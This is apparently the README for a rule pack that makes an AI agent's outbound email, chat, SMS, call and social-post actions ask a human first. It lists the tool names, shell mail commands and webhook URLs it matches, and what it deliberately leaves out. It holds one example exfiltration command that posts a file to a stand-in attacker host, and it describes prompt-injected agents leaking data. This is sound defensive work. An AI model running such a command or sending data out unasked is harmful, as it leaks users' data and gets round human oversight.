# outbound-comms-guard

Human gates on every call that sends a message to a person outside the
session: email, chat, SMS, voice calls and social posts, whether through
an MCP server, a mail CLI, or `curl` to a messaging webhook or send API.
A prompt-injected agent exfiltrates data or spams people through exactly
these calls, and a sent message cannot be recalled, so every rule asks and
is marked irreversible. Drafts, reads and searches are not matched.

```yaml
version: 1
default: allow        # or ask
packs: [floor, outbound-comms-guard]
```

| Rule | Verdict | Covers |
|---|---|---|
| `comms-mcp-send-asks` | ask, irreversible | on any MCP server, send-shaped tool names: `send`/`post`/`reply`/`forward`/`schedule`/`broadcast` + email, mail, message, SMS, MMS, DM, tweet, campaign, newsletter (`send_email`, `send_gmail_message`, `slack_post_message`, `send-mail`, `sendMessage`, `chat_postMessage`, `send_sms`, `slack_schedule_message`); `create_tweet`; `make_call`, `make_outbound_call`, `place_call` |
| `comms-mcp-messaging-server-asks` | ask, irreversible | on a server whose name says it is a messaging server (slack, discord, telegram, teams, gmail, outlook, mail, twilio, sendgrid, resend, postmark, whatsapp, sms, signal, imessage, x/twitter, bluesky, linkedin, reddit, mastodon, microsoft/ms365, intercom, zendesk, zoom, vonage, plivo, pushover, ntfy, mattermost, webex, ...): any `send`, `post`, `reply`, `forward`, `comment`, `publish`, `dm`, `tweet`, `repost` token, `add_/create_/schedule_` + message/comment/post/reply/call/email, and camelCase `CreateMessage`/`CreateCall` (Twilio), `send_draft`, the Gmail connector's bare `reply`/`forward` |
| `comms-shell-mail-sms-asks` | ask, irreversible | `sendmail`, `swaks`, `msmtp`, `ssmtp`, `sendemail`, `mailsend`; `mail`/`mailx`/`mutt`/`neomutt` with `-s`, `-a` or an address; `Send-MailMessage`, `Send-MgUserMail`; `curl smtp(s)://` or `--mail-rcpt`; `git send-email`; Python `smtplib` … `.sendmail(`; `aws ses(v2) send-*`, `aws sns publish --phone-number`; `az communication email/sms send`; `twilio api:core:messages:create` / `calls:create` |
| `comms-shell-webhook-asks` | ask, irreversible | URLs of send endpoints anywhere in a shell command: Slack incoming webhooks and `chat.postMessage`, Discord webhooks and channel messages, Telegram `bot…/send*`, Twilio/Vonage/Plivo messages and calls, SendGrid, Resend, Mailgun, Postmark, SparkPost, Mandrill, Brevo, Mailchimp campaign send, Microsoft Graph `sendMail`/reply/forward/Teams chat and channel messages, Office 365 connector webhooks, Gmail `messages/send`, Google Chat, Pushover, ntfy, WhatsApp Cloud API, X `/2/tweets` and DMs, LinkedIn posts, Bluesky `createRecord`, Mastodon `/api/v1/statuses` |
| `comms-social-post-cli-asks` | ask, irreversible | `twurl`/`xurl` POSTs to tweet and DM endpoints; `bsky post/reply/repost`, `toot post/reply/boost` |

**Drafts pass.** A tool name containing `draft` is not matched
(`create_draft`, `draft_email`, `update_draft`, Slack's
`slack_send_message_draft`), except `send_draft`, which sends. A tool
whose first token is a read verb (`get_`, `list_`, `search_`, `read_`,
`fetch_`, ...) or a mailbox action (`delete_`, `trash_`, `archive_`,
`mark_`, `label_`) never matches. Deleting messages is
`mcp-destructive-tools`' concern.

## What it deliberately does not cover

- **Comments in issue trackers and docs** (`create_comment` on Linear,
  Jira, Notion, GitHub): those are team-internal and routine, so only
  messaging servers' comment tools ask. GitHub comments, issues and PRs
  are out of scope (see `github-safety`).
- **Reactions, channel and label management** (`add_reaction`,
  `create_channel`, `invite_user`): visible to others but carry no
  content from the session.
- **SNS topics and queues.** `aws sns publish --topic-arn` usually feeds
  alerting or other services, so only `--phone-number` asks.
- **Any HTTP POST to an unknown host.** An agent can still exfiltrate
  with `curl -d @file https://attacker.example`. That is an egress
  problem: restrict hosts with `url.host in hosts.allowed` or run under
  `writ run`'s network boundary.
- **Webhook URLs held in a variable** (`curl -d … "$SLACK_WEBHOOK_URL"`):
  writ sees the command text, not the expanded value.
- **The sferik `t` CLI** (`t update`): a one-letter command name is too
  easy to match by accident.
- **Twilio list calls.** `curl` GETs of `…/Messages.json` also ask; the
  send and list endpoints share a path.
- **Agent-to-agent mail servers** (`send_message` on a coordination
  server) ask like any other send; skip `comms-mcp-send-asks` if that is
  your setup.

## Tests

`fixtures/outbound-comms-guard.yaml` (45 cases): every rule, on tool
names from Gmail, the Claude Gmail connector, Slack (reference and
korotovsky servers), Microsoft 365, Twilio, ElevenLabs and Zendesk, and
shell commands for the mail CLIs, AWS SES and the webhook families, plus
near misses that must not fire (`create_draft`, `draft_email`,
`slack_send_message_draft`, `slack_get_thread_replies`,
`slack_add_reaction`, Linear `create_comment`, tmux `send_keys`,
`send_request`, `git config user.email`, `cat /etc/mail/sendmail.cf`,
Telegram `getUpdates`, Slack `conversations.history`, an X tweet lookup,
`xurl` search).
